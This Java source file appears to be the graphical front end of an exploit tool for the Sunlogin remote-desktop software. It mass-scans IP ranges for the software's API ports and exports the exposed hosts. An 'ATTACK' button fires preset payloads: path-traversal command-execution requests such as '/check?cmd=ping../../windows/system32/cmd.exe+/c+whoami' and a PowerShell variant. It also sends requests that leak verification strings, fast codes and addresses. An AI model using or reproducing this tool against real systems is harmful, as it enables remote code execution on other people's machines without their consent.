package sunloginExpGui.mainJFrame;

import java.awt.EventQueue;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.BorderLayout;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
//import javax.swing.JProgressBar;
import javax.swing.JTextArea;
import javax.swing.JComboBox;
import java.awt.event.ItemListener;
import java.util.ArrayList;
import java.awt.event.ItemEvent;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

import sunloginExpGui.common.Exporter;
import sunloginExpGui.common.InputCheck;
import sunloginExpGui.common.PortRangeHandle;
import sunloginExpGui.common.TargetIpOrDomainHandle;
import sunloginExpGui.exploit.GetSunloginInfo;
import sunloginExpGui.exploit.RCE;
import sunloginExpGui.portscan.PortscanBySocketCallFunction;
import sunloginExpGui.portscan.PortscanByNmap;

public class SunloginExpGui {

	private JFrame frame;
	public static JTextField targetFiled;
	private JTextField targetUrlField;
	public static JTextField verifyStringField;
	private JTextField expField;
	private JTextField nmapPathField;
	public static JTextField threadNumField;
	public static JTextField portscanTimeoutField;
	public static JTextField attackTimeoutField;
	public static JTextField portRangeField;

	public static JTextArea portscanTextArea = new JTextArea();
	public static JTextArea expResultTextArea = new JTextArea();
	
	public static boolean stopPortscanFlag = false;
	
	public static JLabel portscanProgressLabel = new JLabel("portscan progress: nothing to do.", JLabel.CENTER);
	
	public static JCheckBox checkAliveIpBox = new JCheckBox();
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					SunloginExpGui window = new SunloginExpGui();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public SunloginExpGui() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setBounds(100, 100, 562, 602);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(new BorderLayout(0, 0));
		
		JPanel mainPanel = new JPanel();
		frame.getContentPane().add(mainPanel, BorderLayout.CENTER);
		mainPanel.setLayout(null);
		
		targetFiled = new JTextField();
		targetFiled.setToolTipText("1.2.3.4 or 1.2.3.0/24 or 1.2.3.4-10 or www.example.com");
		targetFiled.setBounds(224, 23, 121, 25);
		targetFiled.setText("1.2.3.4");
		mainPanel.add(targetFiled);
		targetFiled.setColumns(10);
		
		JScrollPane portscanScrollPane = new JScrollPane();
		portscanScrollPane.setBounds(67, 60, 372, 118);
		mainPanel.add(portscanScrollPane);
		
		//JTextArea portscanTextArea = new JTextArea();
		portscanTextArea.setText("portscan result here.");
		portscanScrollPane.setViewportView(portscanTextArea);
		
		
		String[] portscanMethodList = new String[] {"socket","nmap"};
		JComboBox<String> portscanMethodComboBox = new JComboBox<String>(portscanMethodList);
		//JComboBox portscanMethodComboBox = new JComboBox();
		portscanMethodComboBox.setSelectedIndex(0);
		portscanMethodComboBox.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent e) {
				switch (portscanMethodComboBox.getSelectedItem().toString()) {
				case "socket":
					nmapPathField.setVisible(false);
					portRangeField.setVisible(true);
					checkAliveIpBox.setVisible(true);
					break;
				case "nmap":
					nmapPathField.setVisible(true);
					portRangeField.setVisible(false);
					checkAliveIpBox.setVisible(false);
					break;
				
				default:
					//do something
					break;
				}
			}
		});
		portscanMethodComboBox.setToolTipText("choose a method to scan port");
		portscanMethodComboBox.setBounds(12, 24, 77, 24);
		mainPanel.add(portscanMethodComboBox);
		
		nmapPathField = new JTextField();
		nmapPathField.setToolTipText("nmap path");
		nmapPathField.setText("/usr/bin/nmap -Pn -T4 -p 49000-50000");
		nmapPathField.setBounds(101, 23, 114, 28);
		mainPanel.add(nmapPathField);
		nmapPathField.setColumns(10);
		nmapPathField.setVisible(false);
		
		
	    class PortscanBySocketThread extends Thread{  
	        public void run() {  
	          //do something...  
	        	
	        	TargetIpOrDomainHandle tiodh = new TargetIpOrDomainHandle();
	        	
	        	InputCheck ic0 = new InputCheck();
	        	
	        	PortRangeHandle prh = new PortRangeHandle();
	        	
	    		ArrayList<String> TargetIpList = new ArrayList<String>();	
				
	    		TargetIpList = tiodh.returnTargetIpList();
	    		
	    		if(TargetIpList.isEmpty()) {
	    			System.out.println("Target is empty.");
	    			JOptionPane.showMessageDialog(null, "target is empty!", "Warning", JOptionPane.WARNING_MESSAGE);
	    			return;
	    		}
	    		
	    		int threads = Integer.valueOf(SunloginExpGui.threadNumField.getText().trim()).intValue();
	    		int portscanTimeout = Integer.valueOf(SunloginExpGui.portscanTimeoutField.getText().trim()).intValue(); 
	    		
	    		String portRange = SunloginExpGui.portRangeField.getText().trim();
	    		
	    		if(!ic0.check_port_range(portRange)) {
	    			JOptionPane.showMessageDialog(null, "port range invaild!", "Error", JOptionPane.ERROR_MESSAGE);
	    			System.out.println("port range invaild!");
	    			return;
	    		}
	    		
	    		int startPort = prh.return_min_and_max_port(portRange).get("startPort");
	    		int endPort = prh.return_min_and_max_port(portRange).get("endPort");

	        	
	        	PortscanBySocketCallFunction psbscf = new PortscanBySocketCallFunction(TargetIpList,threads,portscanTimeout,startPort,endPort);
	        	psbscf.portscan_by_socket_call_function();
	        	//PortscanBySocketCallFunction.portscan_by_socket_call_function();
	       }
	  }
	    
	    class PortscanByNmapThread extends Thread{  
	        public void run() {  
	          //do something...  
	        	//ArrayList<String> TargetIpList = new ArrayList<String>();
					
					
				String nmapPathWithCommand = nmapPathField.getText().trim();
		        String nmapPath = nmapPathWithCommand.split(" ")[0];
		        String nmapCommand = nmapPathWithCommand.split(nmapPath)[1];
		        	
		        String nmapTarget = targetFiled.getText().trim();
		        //TargetIpList = TargetIpOrDomainHandle.returnTargetIpList();
		        PortscanByNmap psbn = new PortscanByNmap(nmapPath, nmapCommand);
		        psbn.start_portscan_by_nmap_call_function(nmapTarget);
	       }
	  }
	    
	    
		
		JButton portscanButton = new JButton("portscan");
		portscanButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
				if(portscanMethodComboBox.getSelectedItem() == "socket") {
					PortscanBySocketThread portscanBySocketThread = new PortscanBySocketThread();
					portscanBySocketThread.start();
				}
				if(portscanMethodComboBox.getSelectedItem() == "nmap") {
					PortscanByNmapThread portscanByNmapThread = new PortscanByNmapThread();
					portscanByNmapThread.start();
					
				}
			}
		});
		
		portscanButton.setBounds(451, 23, 99, 25);
		mainPanel.add(portscanButton);
		
		
		targetUrlField = new JTextField();
		targetUrlField.setToolTipText("URL(http://ip:port)");
		targetUrlField.setText("http://1.2.3.4:49999");
		targetUrlField.setBounds(12, 221, 205, 25);
		mainPanel.add(targetUrlField);
		targetUrlField.setColumns(10);
		
		verifyStringField = new JTextField();
		//verifyStringField.setText("verify_string");
		verifyStringField.setText("");
		verifyStringField.setToolTipText("verify_string");
		verifyStringField.setBounds(120, 255, 305, 25);
		mainPanel.add(verifyStringField);
		verifyStringField.setColumns(10);
		
		//JProgressBar portscanProgressBar = new JProgressBar();
		//portscanProgressBar.setBounds(62, 177, 376, 25);
		//mainPanel.add(portscanProgressBar);
		
		portscanProgressLabel.setBounds(62, 177, 376, 25);
		//portscanProgressLabel.setText("portscan progress: nothing to do.");
		mainPanel.add(portscanProgressLabel);
		
		
		expField = new JTextField();
		expField.setText("/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami");
		expField.setBounds(229, 219, 314, 29);
		mainPanel.add(expField);
		expField.setColumns(10);
		
		String[] expList = new String[] {"powershell","cmd0","cmd1","cmd2","getVerifyString","getFastcode","getAddress","getLoginType","customEXP"};
		JComboBox<String> expListComboBox = new JComboBox<String>(expList);
		//JComboBox expListComboBox = new JComboBox();
		
		expListComboBox.setMaximumRowCount(16);
		expListComboBox.setToolTipText("choose an exploit");
		expListComboBox.setSelectedIndex(0);
		expListComboBox.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent e) {
				
				switch (expListComboBox.getSelectedItem().toString()) {
				case "powershell":
					expField.setText("/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami");
					break;
				case "cmd0":
					expField.setText("/check?cmd=ping../../../windows\\\\system32\\\\cmd.exe+/c+whoami");
					break;
				case "cmd1":
					expField.setText("/check?cmd=ping../../../SysWOW64\\\\cmd.exe+/c+whoami");
					break;
				case "cmd2":
					expField.setText("/check?cmd=ping../../../../../../../../../../../windows/system32/whoami");
					break;
					
				case "getVerifyString":
					expField.setText("/cgi-bin/rpc?action=verify-haras");
					break;
				
				case "getFastcode":
					expField.setText("/getfastcode");
					break;
					
				case "getAddress":
					expField.setText("/getaddress");
					break;
					
				case "getLoginType":
					expField.setText("/cgi-bin/rpc?action=login-type");
					break;
					
				case "customEXP":
					expField.setText("/custom-exp");
					break;
				default:
					expField.setText("/unknown");
					break;
				}
				
			}
		});
		expListComboBox.setBounds(62, 292, 143, 24);
		mainPanel.add(expListComboBox);
		
		JScrollPane expResultScrollPane = new JScrollPane();
		expResultScrollPane.setBounds(57, 325, 382, 199);
		mainPanel.add(expResultScrollPane);
		
		//JTextArea expResultTextArea = new JTextArea();
		expResultTextArea.setText("exp result here.");
		expResultScrollPane.setViewportView(expResultTextArea);
		
		class AttackThread extends Thread{  
	        public void run() {  
	          //do something...  
	        	expResultTextArea.append("\nStarting attack......\n");
				
				String targetUrl = targetUrlField.getText().trim();
				String exp = expField.getText().trim();
				int httpTimeout = Integer.valueOf(attackTimeoutField.getText().trim()).intValue();
				
				String rceResult = "";
				String finalUrl = targetUrl + exp;
				
				RCE rce = new RCE(finalUrl,httpTimeout);
				GetSunloginInfo gsli = new GetSunloginInfo(finalUrl,httpTimeout);
				
				switch (expListComboBox.getSelectedItem().toString()) {
				case "powershell":
					rceResult = rce.rce_by_check_api();
					break;
				case "cmd0":
					rceResult = rce.rce_by_check_api();
					break;
				case "cmd1":
					rceResult = rce.rce_by_check_api();
					break;
				case "cmd2":
					rceResult = rce.rce_by_check_api();
					break;
					
				case "getVerifyString":
					rceResult = gsli.get_verify_string();
					//verifyStringField.setText(rceResult);
					break;
					
				case "getFastcode":
					rceResult = gsli.get_fastcode();
					break;
					
				case "getAddress":
					rceResult = gsli.get_address();
					break;
					
				case "getLoginType":
					rceResult = gsli.get_login_type();
					break;
					
				case "customEXP":
					rceResult = rce.rce_by_check_api();
					break;
					
				default:
					
					break;
				}
				
				System.out.println("rceResult: [" + rceResult + "]");
				
				
				expResultTextArea.append("\nrceResult: [" + rceResult + "]\n");
				expResultTextArea.append("---------------------------------Attack over---------------------------------\n");
				SunloginExpGui.expResultTextArea.selectAll();
	       }
	  }
		
		JButton attackButton = new JButton("ATTACK");
		attackButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AttackThread attackThread = new AttackThread();
				attackThread.start();
				
			}
		});
		
		
		
		attackButton.setBounds(339, 289, 99, 25);
		mainPanel.add(attackButton);
		
		JButton portscanExportButton = new JButton("export");
		portscanExportButton.setToolTipText("those have sunlogin api port");
		portscanExportButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				portscanTextArea.append("Starting export portscan result......\n");
				if(PortscanBySocketCallFunction.returnIpWithSunloginVulnApiPortList.isEmpty() && PortscanByNmap.returnIpWithSunloginVulnApiPortList.isEmpty()) {
					JOptionPane.showMessageDialog(null, "Found 0 vulnerable, so nothing export.", "Info", JOptionPane.INFORMATION_MESSAGE);
					System.out.println("Found 0 vulnerable, so nothing export.");
				}
				else {
					if(!(PortscanBySocketCallFunction.returnIpWithSunloginVulnApiPortList.isEmpty())) {
						Exporter exportPortscanResult = new Exporter();
						exportPortscanResult.export_portscan_result(PortscanBySocketCallFunction.returnIpWithSunloginVulnApiPortList);
						JOptionPane.showMessageDialog(null, "Export portscan(socket) result successfully", "Info", JOptionPane.INFORMATION_MESSAGE);
						System.out.println("Export portscan(socket) result successfully");
					}
					else {
						Exporter exportPortscanResult = new Exporter();
						exportPortscanResult.export_portscan_result(PortscanByNmap.returnIpWithSunloginVulnApiPortList);
						JOptionPane.showMessageDialog(null, "Export portscan(nmap) result successfully", "Info", JOptionPane.INFORMATION_MESSAGE);
						System.out.println("Export portscan(nmap) result successfully");
					}
				}
				portscanTextArea.append("Portscan result exported.\n");
			}
		});
		portscanExportButton.setBounds(439, 105, 98, 25);
		mainPanel.add(portscanExportButton);
		
		JButton portscanClearButton = new JButton("clear");
		portscanClearButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
				PortscanBySocketCallFunction.returnIpWithSunloginVulnApiPortList.clear();
				PortscanByNmap.returnIpWithSunloginVulnApiPortList.clear();
				portscanTextArea.setText("Portscan result here. Cleared");
				
			}
		});
		portscanClearButton.setBounds(440, 142, 98, 25);
		mainPanel.add(portscanClearButton);
		
		JButton expResultClearButton = new JButton("clear");
		expResultClearButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				expResultTextArea.setText("EXP result here. Cleared.");
			}
		});
		expResultClearButton.setBounds(450, 489, 93, 25);
		mainPanel.add(expResultClearButton);
		
		JButton stopPortscanButton = new JButton("stop");
		stopPortscanButton.setToolTipText("stop portscan");
		stopPortscanButton.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				portscanTextArea.append("Stopping port scan......\n");
				
				/*
			    try {
			        executorService.shutdown();
			        if (!executorService.awaitTermination(5, TimeUnit.SECONDS)) {
			          executorService.shutdownNow();
			        }
			      } catch (InterruptedException e) {
			        executorService.shutdownNow();
			      }
			      */
				stopPortscanFlag = true;
				
				//portscanTextArea.append("Stopped !\n");
			}
		});
		
		stopPortscanButton.setBounds(441, 60, 85, 25);
		mainPanel.add(stopPortscanButton);
		
		
		
		threadNumField = new JTextField();
		threadNumField.setToolTipText("threads");
		threadNumField.setText("100");
		threadNumField.setBounds(12, 59, 42, 19);
		mainPanel.add(threadNumField);
		threadNumField.setColumns(10);
		
		portscanTimeoutField = new JTextField();
		portscanTimeoutField.setToolTipText("timeout/milliseconds");
		portscanTimeoutField.setText("500");
		portscanTimeoutField.setBounds(12, 95, 42, 19);
		mainPanel.add(portscanTimeoutField);
		portscanTimeoutField.setColumns(10);
		
		checkAliveIpBox.setToolTipText("check ip alive before portscan");
		checkAliveIpBox.setText("CheckIP");
		checkAliveIpBox.setBounds(12, 120, 50, 20);
		checkAliveIpBox.setSelected(false);
		mainPanel.add(checkAliveIpBox);
		
		
		attackTimeoutField = new JTextField();
		attackTimeoutField.setToolTipText("timeout/milliseconds");
		attackTimeoutField.setText("10000");
		attackTimeoutField.setBounds(455, 292, 71, 19);
		mainPanel.add(attackTimeoutField);
		attackTimeoutField.setColumns(10);
		
		portRangeField = new JTextField();
		portRangeField.setToolTipText("80 or 80-8080");
		portRangeField.setText("49000-50000");
		portRangeField.setBounds(353, 26, 93, 19);
		mainPanel.add(portRangeField);
		portRangeField.setColumns(10);
		
		
	}
	
	
	
}
